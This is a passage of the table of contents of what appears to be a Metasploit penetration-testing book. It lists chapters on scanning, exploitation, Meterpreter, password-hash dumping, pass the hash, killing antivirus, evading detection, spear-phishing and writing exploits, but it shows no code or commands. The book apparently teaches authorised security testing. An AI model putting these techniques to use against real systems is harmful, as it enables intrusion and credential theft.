trademark.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;line-height: 106%;text-align: left;">The information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been taken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any person or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the information contained in it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 15pt;padding-left: 29pt;text-indent: 0pt;text-align: center;">B R I E F  C O N T E N T S </p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark3" class="a">Foreword by HD Moore </a><a href="#bookmark3">xiii</a></p><p class="s12" style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;">Preface xvii</p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark7">Acknowledgments xix</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark17" class="a">Introduction </a><a href="#bookmark17">xxi</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark40" class="a">Chapter 1: The Absolute Basics of Penetration Testing </a><a href="#bookmark40">1</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark72" class="a">Chapter 2: Metasploit Basics </a><a href="#bookmark72">7</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark106" class="a">Chapter 3: Intelligence Gathering </a><a href="#bookmark106">15</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark142" class="a">Chapter 4: Vulnerability Scanning </a><a href="#bookmark142">35</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark177" class="a">Chapter 5: The Joy of Exploitation </a><a href="#bookmark177">57</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark221" class="a">Chapter 6: Meterpreter </a><a href="#bookmark221">75</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark258" class="a">Chapter 7: Avoiding Detection </a><a href="#bookmark258">99</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark275" class="a">Chapter 8: Exploitation Using Client-Side Attacks </a><a href="#bookmark275">109</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark289" class="a">Chapter 9: Metasploit Auxiliary Modules </a><a href="#bookmark289">123</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark309" class="a">Chapter 10: The Social-Engineer Toolkit </a><a href="#bookmark309">135</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark335" class="a">Chapter 11: Fast-Track </a><a href="#bookmark335">163</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark352" class="a">Chapter 12: Karmetasploit </a><a href="#bookmark352">177</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark370" class="a">Chapter 13: Building Your Own Module </a><a href="#bookmark370">185</a></p><p style="padding-top: 3pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark389" class="a">Chapter 14: Creating Your Own Exploits </a><a href="#bookmark389">197</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark413" class="a">Chapter 15: Porting Exploits to the Metasploit Framework </a><a href="#bookmark413">215</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark439" class="a">Chapter 16: Meterpreter Scripting </a><a href="#bookmark439">235</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark462" class="a">Chapter 17: Simulated Penetration Test </a><a href="#bookmark462">251</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark484" class="a">Appendix A: Configuring Your Target Machines </a><a href="#bookmark484">267</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark502" class="a">Appendix B: Cheat Sheet </a><a href="#bookmark502">275</a></p><p class="s12" style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;">Index 285</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s13" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">vi <span class="s14">Brief Contents </span></p><p class="s11" style="padding-top: 6pt;padding-left: 29pt;text-indent: 0pt;text-align: center;">C O N T E N T S  I N  D E T A I L </p><p class="s15" style="padding-top: 25pt;padding-left: 18pt;text-indent: 0pt;text-align: left;">FOREWORD by HD Moore xiii</p><p style="padding-top: 18pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark4" class="s16">PREFACE xvii</a></p><p style="padding-top: 18pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark7" class="s16">ACKNOWLEDGMENTS xix</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark9" class="a">Special Thanks </a><a href="#bookmark9">xx</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark17" class="s16">INTRODUCTION xxi</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark19" class="a">Why Do A Penetration Test? </a><a href="#bookmark19">xxii</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark20" class="a">Why Metasploit? </a><a href="#bookmark20">xxii</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark21" class="a">A Brief History of Metasploit </a><a href="#bookmark21">xxii</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark22" class="a">About this Book </a><a href="#bookmark22">xxiii</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark23" class="a">What’s in the Book? </a><a href="#bookmark23">xxiii</a></p><p class="s12" style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;">A Note on Ethics xxiv</p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark40" class="s16">1</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark40" class="s16">THE ABSOLUTE BASICS OF PENETRATION TESTING 1</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark41" class="a">The Phases of the PTES </a><a href="#bookmark41">2</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark42" class="a">Pre-engagement Interactions </a><a href="#bookmark42">2</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark43" class="a">Intelligence Gathering </a><a href="#bookmark43">2</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark44" class="a">Threat Modeling </a><a href="#bookmark44">2</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark45" class="a">Vulnerability Analysis </a><a href="#bookmark45">3</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark46" class="a">Exploitation </a><a href="#bookmark46">3</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark47" class="a">Post Exploitation </a><a href="#bookmark47">3</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark48" class="a">Reporting </a><a href="#bookmark48">4</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark49" class="a">Types of Penetration Tests </a><a href="#bookmark49">4</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark50" class="a">Overt Penetration Testing </a><a href="#bookmark50">5</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark51" class="a">Covert Penetration Testing </a><a href="#bookmark51">5</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark52" class="a">Vulnerability Scanners </a><a href="#bookmark52">5</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark53" class="a">Pulling It All Together </a><a href="#bookmark53">6</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark72" class="s16">2</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark72" class="s16">METASPLOIT BASICS 7</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark73" class="a">Terminology </a><a href="#bookmark73">7</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark74" class="a">Exploit </a><a href="#bookmark74">8</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark75" class="a">Payload </a><a href="#bookmark75">8</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark76" class="a">Shellcode </a><a href="#bookmark76">8</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark77" class="a">Module </a><a href="#bookmark77">8</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark78" class="a">Listener </a><a href="#bookmark78">8</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark79" class="a">Metasploit Interfaces </a><a href="#bookmark79">8</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark80" class="a">MSFconsole </a><a href="#bookmark80">9</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark81" class="a">MSFcli </a><a href="#bookmark81">9</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark82" class="a">Armitage </a><a href="#bookmark82">11</a></p><p style="padding-top: 3pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark83" class="a">Metasploit Utilities </a><a href="#bookmark83">12</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark84" class="a">MSFpayload </a><a href="#bookmark84">12</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark85" class="a">MSFencode </a><a href="#bookmark85">13</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark86" class="a">Nasm Shell </a><a href="#bookmark86">13</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark87" class="a">Metasploit Express and Metasploit Pro </a><a href="#bookmark87">14</a></p><p class="s12" style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;">Wrapping Up 14</p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark106" class="s16">3</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark106" class="s16">INTELLIGENCE GATHERING 15</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark107" class="a">Passive Information Gathering </a><a href="#bookmark107">16</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark108" class="a">whois Lookups </a><a href="#bookmark108">16</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark109" class="a">Netcraft </a><a href="#bookmark109">17</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark110" class="a">NSLookup </a><a href="#bookmark110">18</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark111" class="a">Active Information Gathering </a><a href="#bookmark111">18</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark112" class="a">Port Scanning with Nmap </a><a href="#bookmark112">18</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark113" class="a">Working with Databases in Metasploit </a><a href="#bookmark113">20</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark114" class="a">Port Scanning with Metasploit </a><a href="#bookmark114">25</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark115" class="a">Targeted Scanning </a><a href="#bookmark115">26</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark116" class="a">Server Message Block Scanning </a><a href="#bookmark116">26</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark117" class="a">Hunting for Poorly Configured Microsoft SQL Servers </a><a href="#bookmark117">27</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark118" class="a">SSH Server Scanning </a><a href="#bookmark118">28</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark119" class="a">FTP Scanning </a><a href="#bookmark119">29</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark120" class="a">Simple Network Management Protocol Sweeping </a><a href="#bookmark120">30</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark121" class="a">Writing a Custom Scanner </a><a href="#bookmark121">31</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark122" class="a">Looking Ahead </a><a href="#bookmark122">33</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark142" class="s16">4</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark142" class="s16">VULNERABILITY SCANNING 35</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark143" class="a">The Basic Vulnerability Scan </a><a href="#bookmark143">36</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark144" class="a">Scanning with NeXpose </a><a href="#bookmark144">37</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark145" class="a">Configuration </a><a href="#bookmark145">37</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark146" class="a">Importing Your Report into the Metasploit Framework </a><a href="#bookmark146">42</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark147" class="a">Running NeXpose Within MSFconsole </a><a href="#bookmark147">43</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark148" class="a">Scanning with Nessus </a><a href="#bookmark148">44</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark149" class="a">Nessus Configuration </a><a href="#bookmark149">44</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark150" class="a">Creating a Nessus Scan Policy </a><a href="#bookmark150">45</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark151" class="a">Running a Nessus Scan </a><a href="#bookmark151">47</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark152" class="a">Nessus Reports </a><a href="#bookmark152">47</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark153" class="a">Importing Results into the Metasploit Framework </a><a href="#bookmark153">48</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark154" class="a">Scanning with Nessus from Within Metasploit </a><a href="#bookmark154">49</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark155" class="a">Specialty Vulnerability Scanners </a><a href="#bookmark155">51</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark156" class="a">Validating SMB Logins </a><a href="#bookmark156">51</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark157" class="a">Scanning for Open VNC Authentication </a><a href="#bookmark157">52</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark158" class="a">Scanning for Open X11 Servers </a><a href="#bookmark158">54</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark159" class="a">Using Scan Results for Autopwning </a><a href="#bookmark159">56</a></p><p style="padding-top: 12pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark177" class="s16">5</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark177" class="s16">THE JOY OF EXPLOITATION 57</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark178" class="a">Basic Exploitation </a><a href="#bookmark178">58</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark179" class="a">msf&gt; show exploits </a><a href="#bookmark179">58</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark180" class="a">msf&gt; show auxiliary </a><a href="#bookmark180">58</a></p><p style="padding-top: 3pt;padding-left: 54pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark181" class="a">msf&gt; show options </a><a href="#bookmark181">58</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark182" class="a">msf&gt; show payloads </a><a href="#bookmark182">60</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark183" class="a">msf&gt; show targets </a><a href="#bookmark183">62</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark184" class="a">info </a><a href="#bookmark184">63</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark185" class="a">set and unset </a><a href="#bookmark185">63</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark186" class="a">setg and unsetg </a><a href="#bookmark186">64</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark187" class="a">save </a><a href="#bookmark187">64</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark188" class="a">Exploiting Your First Machine </a><a href="#bookmark188">64</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark189" class="a">Exploiting an Ubuntu Machine </a><a href="#bookmark189">68</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark190" class="a">All-Ports Payloads: Brute Forcing Ports </a><a href="#bookmark190">71</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark191" class="a">Resource Files </a><a href="#bookmark191">72</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark192" class="a">Wrapping Up </a><a href="#bookmark192">73</a></p><p style="padding-top: 13pt;padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark221" class="s16">6</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark221" class="s16">METERPRETER 75</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark222" class="a">Compromising a Windows XP Virtual Machine </a><a href="#bookmark222">76</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark223" class="a">Scanning for Ports with Nmap </a><a href="#bookmark223">76</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark224" class="a">Attacking MS SQL </a><a href="#bookmark224">76</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark225" class="a">Brute Forcing MS SQL Server </a><a href="#bookmark225">78</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark226" class="a">The xp_cmdshell </a><a href="#bookmark226">79</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark227" class="a">Basic Meterpreter Commands </a><a href="#bookmark227">80</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark228" class="a">Capturing Keystrokes </a><a href="#bookmark228">81</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark229" class="a">Dumping Usernames and Passwords </a><a href="#bookmark229">82</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark230" class="a">Extracting the Password Hashes </a><a href="#bookmark230">82</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark231" class="a">Dumping the Password Hash </a><a href="#bookmark231">83</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark232" class="a">Pass the Hash </a><a href="#bookmark232">84</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark233" class="a">Privilege Escalation </a><a href="#bookmark233">85</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark234" class="a">Token Impersonation </a><a href="#bookmark234">87</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark235" class="a">Using ps </a><a href="#bookmark235">87</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark236" class="a">Pivoting onto Other Systems </a><a href="#bookmark236">89</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark237" class="a">Using Meterpreter Scripts </a><a href="#bookmark237">92</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark238" class="a">Migrating a Process </a><a href="#bookmark238">92</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark239" class="a">Killing Antivirus Software </a><a href="#bookmark239">93</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark240" class="a">Obtaining System Password Hashes </a><a href="#bookmark240">93</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark241" class="a">Viewing All Traffic on a Target Machine </a><a href="#bookmark241">93</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark242" class="a">Scraping a System </a><a href="#bookmark242">93</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark243" class="a">Using Persistence </a><a href="#bookmark243">94</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark244" class="a">Leveraging Post Exploitation Modules </a><a href="#bookmark244">95</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark245" class="a">Upgrading Your Command Shell to Meterpreter </a><a href="#bookmark245">95</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark246" class="a">Manipulating Windows APIs with the Railgun Add-On </a><a href="#bookmark246">97</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark247" class="a">Wrapping Up </a><a href="#bookmark247">97</a></p><p style="padding-top: 13pt;padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark258" class="s16">7</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark258" class="s16">AVOIDING DETECTION 99</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark259" class="a">Creating Stand-Alone Binaries with MSFpayload </a><a href="#bookmark259">100</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark260" class="a">Evading Antivirus Detection </a><a href="#bookmark260">101</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark261" class="a">Encoding with MSFencode </a><a href="#bookmark261">102</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark262" class="a">Multi-encoding </a><a href="#bookmark262">103</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark263" class="a">Custom Executable Templates </a><a href="#bookmark263">105</a></p><p class="s12" style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;">Launching a Payload Stealthily 106</p><p style="padding-top: 3pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark264" class="a">Packers </a><a href="#bookmark264">107</a></p><p class="s12" style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;">A Final Note on Antivirus Software Evasion 108</p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark275" class="s16">8</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark275" class="s16">EXPLOITATION USING CLIENT-SIDE ATTACKS 109</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark276" class="a">Browser-Based Exploits </a><a href="#bookmark276">110</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark277" class="a">How Browser-Based Exploits Work </a><a href="#bookmark277">111</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark278" class="a">Looking at NOPs </a><a href="#bookmark278">112</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark279" class="a">Using Immunity Debugger to Decipher NOP Shellcode </a><a href="#bookmark279">112</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark280" class="a">Exploring the Internet Explorer Aurora Exploit </a><a href="#bookmark280">116</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark281" class="a">File Format Exploits </a><a href="#bookmark281">119</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark282" class="a">Sending the Payload </a><a href="#bookmark282">120</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark283" class="a">Wrapping Up </a><a href="#bookmark283">121</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark289" class="s16">9</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark289" class="s16">METASPLOIT AUXILIARY MODULES 123</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark290" class="a">Auxiliary Modules in Use </a><a href="#bookmark290">126</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark291" class="a">Anatomy of an Auxiliary Module </a><a href="#bookmark291">128</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark292" class="a">Going Forward </a><a href="#bookmark292">133</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark309" class="s16">10 </a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark309" class="s16">THE SOCIAL-ENGINEER TOOLKIT 135</a></p><p style="padding-top: 2pt;padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark310" class="a">Configuring the Social-Engineer Toolkit </a><a href="#bookmark310">136</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark311" class="a">Spear-Phishing Attack Vector </a><a 